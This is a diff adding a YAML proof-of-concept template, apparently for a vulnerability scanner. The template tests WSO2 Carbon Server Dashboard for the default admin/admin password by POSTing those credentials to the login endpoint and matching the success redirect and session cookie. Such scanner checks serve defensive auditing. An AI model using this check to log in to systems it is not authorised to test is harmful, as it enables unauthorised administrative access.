@@ -1,0 +1,21 @@
+id: poc-yaml-wso2-carbon-pass-weak
+info:
+  name: WSO2 Carbon Server Dashboard 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: WSO2
+  osprey-id: vb_2022_0063
+requests:
+- method: POST
+  path: /carbon/admin/login_action.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=admin
+  expression: 'status_code == 302 && contains(headers, "/carbon/admin/index.jsp?loginStatus=true")
+
+    && contains(headers, "JSESSIONID")
+
+    '
+variables: {}
+transport: http
